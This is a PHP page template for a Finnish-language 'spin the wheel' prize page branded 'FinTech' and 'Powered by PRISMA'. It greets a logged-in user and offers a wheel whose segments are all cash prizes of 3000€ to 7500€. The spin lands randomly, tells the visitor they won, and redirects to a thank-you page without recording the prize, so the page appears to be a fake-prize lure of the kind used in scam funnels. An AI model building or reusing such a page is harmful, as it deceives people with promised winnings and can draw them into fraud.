<?php
ob_start();
$userName = htmlspecialchars($_SESSION['user_name'] ?? '');

// Prize labels shown on the wheel; edit as needed.
$segments = [
    '7500€', '4600€', '4500€', '4700€', '4800€', '5000€', '3000€', '3000€', '6500€'
];
?>

<div class="min-h-screen flex items-start justify-center px-4 pt-10 pb-16 relative overflow-hidden">
    <div class="absolute inset-0" style="background: radial-gradient(1200px 700px at 50% 20%, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0) 45%), linear-gradient(180deg, #0996d4 0%, #0b7fbc 55%, #0a6fb2 100%);"></div>

    <div class="relative z-10 w-full max-w-4xl mx-auto flex flex-col items-center">
        <div class="text-center mb-6">
            <h1 class="text-4xl md:text-5xl font-extrabold tracking-wide" style="color:#ffcc2a; text-shadow: 0 2px 0 rgba(0,0,0,0.08);">
                <?= $userName ?>
            </h1>
            <p class="text-white/90 text-sm md:text-base mt-1">
                <?= htmlspecialchars($wheelTexts['wheel_subtitle'] ?? 'Onnittelut! Olet ansainnut oikeuden pyörittää pyörää.') ?>
            </p>
        </div>

        <div class="card" id="wheelApp">
            <div class="wheel-wrap">
                <div class="pointer" aria-hidden="true"></div>

                <div id="wheel" class="wheel" aria-label="Onnenpyörä">
                    <canvas id="wheelCanvas"></canvas>
                    <div class="center-cap">VOITA</div>
                </div>
            </div>

            <button id="spinButton" class="spin-btn">PYÖRITÄ PYÖRÄÄ</button>
            <p class="result" id="resultText"></p>
        </div>
    </div>

    <div class="absolute bottom-6 left-1/2 -translate-x-1/2 text-white/70 text-xs">
        <div class="flex items-center justify-center gap-3">
            <div>Powered by</div>
            <img id="prisma-logo" src="/prisma_logo.png" alt="PRISMA" class="h-20 w-auto opacity-100" />
        </div>
    </div>
</div>

<style>
    :root {
        --button: #ffd000;
        --button-hover: #ffbd00;
        --ring: #38e3ff;
    }
    .card {
        --size: min(72vmin, 420px);
        width: min(520px, 100%);
        text-align: center;
        position: relative;
        margin: 0 auto;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    .wheel-wrap {
        position: relative;
        width: var(--size);
        max-width: 100%;
        /* Çark ilə altındakı sarı buton arasına daha da çox məsafə qoy */
        margin: 10px auto 52px;
        filter: drop-shadow(0 18px 30px rgba(0, 0, 0, 0.35));
    }
    .wheel-wrap::after {
        content: '';
        position: absolute;
        inset: -16px;
        border-radius: 50%;
        background: radial-gradient(circle, rgba(0, 208, 255, 0.22), rgba(0, 123, 255, 0) 65%);
        filter: blur(4px);
        z-index: 0;
    }
    .pointer {
        position: absolute;
        top: -12px;
        left: 50%;
        transform: translateX(-50%) rotate(180deg);
        width: 0;
        height: 0;
        border-left: 16px solid transparent;
        border-right: 16px solid transparent;
        border-bottom: 28px solid #ffc104;
        filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.35));
        z-index: 3;
    }
    .pointer::after {
        content: '';
        position: absolute;
        top: 22px;
        left: -6px;
        width: 14px;
        height: 14px;
        background: linear-gradient(135deg, #ff9234, #ff5c00);
        border-radius: 50%;
        box-shadow: 0 0 0 3px #fff, 0 0 12px rgba(255, 146, 52, 0.9);
    }
    .wheel {
        position: relative;
        width: var(--size);
        height: var(--size);
        max-width: 100%;
        border-radius: 50%;
        margin: 0 auto;
        background: radial-gradient(circle at 50% 50%, #0a62d9 0%, #053d92 62%, #021f48 100%);
        box-shadow:
            0 0 0 12px #003f95,
            0 0 0 18px var(--ring),
            0 0 0 24px rgba(0, 227, 255, 0.5),
            0 0 38px 18px rgba(0, 204, 255, 0.35),
            0 28px 46px rgba(0, 0, 0, 0.4);
        overflow: hidden;
        transition: transform 5.2s cubic-bezier(0.12, 0.64, 0, 1);
        z-index: 1;
    }
    .wheel::before {
        content: '';
        position: absolute;
        inset: 10px;
        border-radius: 50%;
        background: radial-gradient(circle, rgba(255,255,255,0.08), rgba(255,255,255,0));
        z-index: 1;
        pointer-events: none;
    }
    canvas {
        position: absolute;
        inset: 0;
        width: 100%;
        height: 100%;
    }
    .center-cap {
        position: absolute;
        width: 118px;
        height: 118px;
        border-radius: 50%;
        background: radial-gradient(circle at 35% 32%, #fff4b0, #ffc200 55%, #f3780f 100%);
        border: 6px solid #fff7ce;
        box-shadow: 0 12px 20px rgba(0, 0, 0, 0.35), 0 0 18px rgba(255, 190, 0, 0.65);
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: grid;
        place-items: center;
        color: #8c4a00;
        font-weight: 700;
        z-index: 2;
        text-shadow: 0 2px 4px rgba(255, 255, 255, 0.6);
    }
    .center-cap::before {
        content: '';
        position: absolute;
        inset: 10px;
        border-radius: 50%;
        background: radial-gradient(circle at 50% 45%, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0));
        mix-blend-mode: screen;
    }
    .spin-btn {
        width: 100%;
        margin-top: 18px; /* Çarkın altından bir az daha aşağıda olsun */
        padding: 16px;
        font-size: 16px;
        font-weight: 700;
        background: linear-gradient(180deg, var(--button), #f3a300);
        border: none;
        border-radius: 12px;
        color: #0b2c4d;
        cursor: pointer;
        box-shadow: 0 12px 24px rgba(0, 0, 0, 0.28), inset 0 2px 0 rgba(255, 255, 255, 0.35);
        transition: transform 0.1s ease, box-shadow 0.1s ease, background 0.2s ease;
    }
    .spin-btn:hover { background: linear-gradient(180deg, var(--button), var(--button-hover)); }
    .spin-btn:active {
        transform: translateY(2px);
        box-shadow: 0 8px 18px rgba(0, 0, 0, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.2);
    }
    .spin-btn:disabled {
        cursor: not-allowed;
        opacity: 0.7;
    }
    .result {
        margin-top: 12px;
        font-weight: 600;
        min-height: 24px;
        color: #ffef9a;
    }
    /* PRISMA logosu üçün fonu vizual olaraq sil – gradientlə qarışdır */
    #prisma-logo {
        background-color: transparent;
        mix-blend-mode: multiply;
    }
</style>

<script>
const segments = <?= json_encode($segments, JSON_UNESCAPED_UNICODE) ?>;
const colors = ['#0fa4ff', '#ff6c34', '#8a45d9', '#00b7ff', '#0fa4ff', '#2ecf73', '#2ecf73', '#ff4fe3', '#b8c84a'];
const wheelEl = document.getElementById('wheel');
const canvas = document.getElementById('wheelCanvas');
const resultText = document.getElementById('resultText');
const spinButton = document.getElementById('spinButton');
const ctx = canvas.getContext('2d');

let currentRotation = 0;
let isSpinning = false;

function clamp(v) {
    return Math.min(255, Math.max(0, Math.round(v)));
}
function shadeColor(color, percent) {
    const num = parseInt(color.slice(1), 16);
    const r = clamp((num >> 16) + (255 * percent) / 100);
    const g = clamp(((num >> 8) & 0x00ff) + (255 * percent) / 100);
    const b = clamp((num & 0x0000ff) + (255 * percent) / 100);
    return '#' + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);
}
function lighten(color, amount) { return shadeColor(color, amount); }
function darken(color, amount) { return shadeColor(color, -amount); }

function resizeCanvas() {
    const rect = wheelEl.getBoundingClientRect();
    const size = Math.round(Math.min(rect.width, rect.height));
    const dpr = window.devicePixelRatio || 1;

    canvas.width = Math.round(size * dpr);
    canvas.height = Math.round(size * dpr);
    canvas.style.width = size + 'px';
    canvas.style.height = size + 'px';

    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    drawWheel(size);
}

function drawWheel(size) {
    const center = size / 2;
    const radius = center - 18;
    const arc = (Math.PI * 2) / segments.length;
    const startAngleBase = -Math.PI / 2;

    ctx.clearRect(0, 0, size, size);
    ctx.save();
    ctx.translate(center, center);

    segments.forEach((label, i) => {
        const start = startAngleBase + i * arc;
        const end = start + arc;
        const baseColor = colors[i % colors.length];
        const grad = ctx.createRadialGradient(0, 0, radius * 0.05, 0, 0, radius);
        grad.addColorStop(0, lighten(baseColor, 18));
        grad.addColorStop(0.55, baseColor);
        grad.addColorStop(1, darken(baseColor, 12));

        ctx.beginPath();
        ctx.moveTo(0, 0);
        ctx.arc(0, 0, radius, start, end);
        ctx.closePath();
        ctx.fillStyle = grad;
        ctx.fill();

        ctx.save();
        ctx.rotate(start + arc / 2);
        ctx.fillStyle = '#ffffff';
        ctx.strokeStyle = 'rgba(0,0,0,0.28)';
        ctx.lineWidth = 3;
        const fontSize = Math.max(14, Math.min(22, Math.round(size * 0.052)));
        ctx.font = `700 ${fontSize}px Inter, sans-serif`;
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        const textX = radius * 0.62;
        ctx.strokeText(label, textX, 0);
        ctx.fillText(label, textX, 0);
        ctx.restore();
    });

    // Outer glow dots
    const dotCount = 64;
    const dotRadius = radius + 8;
    ctx.fillStyle = '#8ef0ff';
    for (let i = 0; i < dotCount; i++) {
        const angle = (Math.PI * 2 * i) / dotCount;
        const x = Math.cos(angle) * dotRadius;
        const y = Math.sin(angle) * dotRadius;
        ctx.beginPath();
        ctx.arc(x, y, Math.max(2.6, size * 0.0085), 0, Math.PI * 2);
        ctx.fill();
    }

    ctx.restore();
}

function spinToIndex(index) {
    const segmentDeg = 360 / segments.length;
    const targetBase = 90 - segmentDeg * (index + 0.5);
    let finalRotation = targetBase;
    while (finalRotation <= currentRotation + 720) {
        finalRotation += 360;
    }
    currentRotation = finalRotation;
    wheelEl.style.transform = `rotate(${finalRotation}deg)`;
}

function spin() {
    if (isSpinning) return;
    isSpinning = true;
    spinButton.disabled = true;
    spinButton.textContent = 'Pyörii...';
    resultText.textContent = '';

    const idx = Math.floor(Math.random() * segments.length);
    spinToIndex(idx);

    setTimeout(() => {
        resultText.textContent = `Voitit: ${segments[idx]}`;
        window.location.href = '/thank-you';
    }, 5200);
}

window.addEventListener('resize', resizeCanvas);
resizeCanvas();
spinButton.addEventListener('click', spin);
</script>

<?php
$content = ob_get_clean();
$title = 'Pyöräytä Pyörää - FinTech';
$additionalStyles = '<style>body{background:#0996d4 !important;}</style>';
include __DIR__ . '/../layout.php';
?>

